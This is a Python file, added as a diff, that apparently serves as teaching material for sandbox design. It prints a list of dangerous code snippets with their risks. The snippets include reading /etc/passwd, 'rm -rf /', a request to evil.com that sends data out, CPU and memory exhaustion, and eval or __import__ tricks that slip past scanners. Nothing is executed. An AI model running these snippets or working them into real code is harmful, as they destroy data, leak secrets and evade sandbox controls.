@@ -1,0 +1,52 @@
+# ⚠️ DANGER ZONE — These are EXAMPLES of dangerous code.
+# We will NOT execute them. We'll show them to understand the risks.
+
+dangerous_examples = [
+    {
+        "name": "File System Access",
+        "code": """import os; os.listdir('/'); open('/etc/passwd').read()""",
+        "risk": "Read sensitive files, traverse directories, exfiltrate data",
+    },
+    {
+        "name": "System Commands",
+        "code": """import subprocess; subprocess.run(['rm', '-rf', '/'], shell=True)""",
+        "risk": "Execute arbitrary shell commands, destroy data",
+    },
+    {
+        "name": "Network Access",
+        "code": """import urllib.request; urllib.request.urlopen('http://evil.com/steal?data=...')""",
+        "risk": "Exfiltrate data, download malware, call external APIs",
+    },
+    {
+        "name": "Infinite Loop",
+        "code": """while True: pass""",
+        "risk": "Denial of service — consumes CPU forever, no way to recover",
+    },
+    {
+        "name": "Memory Bomb",
+        "code": """x = 'A' * (10**10)""",
+        "risk": "Allocate gigabytes of memory, crash the system",
+    },
+    {
+        "name": "Import Hijacking",
+        "code": """__import__('os').system('whoami')""",
+        "risk": "Bypass import restrictions using __import__ builtin",
+    },
+    {
+        "name": "Code Injection via eval",
+        "code": """eval("__import__('os').system('ls')")""",
+        "risk": "Nested evaluation bypasses surface-level code scanning",
+    },
+]
+
+print("=" * 70)
+print(f"{'DANGEROUS CODE PATTERNS':^70}")
+print("=" * 70)
+for i, ex in enumerate(dangerous_examples, 1):
+    print(f"\n{i}. {ex['name']}")
+    print(f"   Code: {ex['code'][:80]}...")
+    print(f"   Risk: {ex['risk']}")
+
+print("\n" + "=" * 70)
+print("Our sandbox must block ALL of these patterns.")
+print("=" * 70)
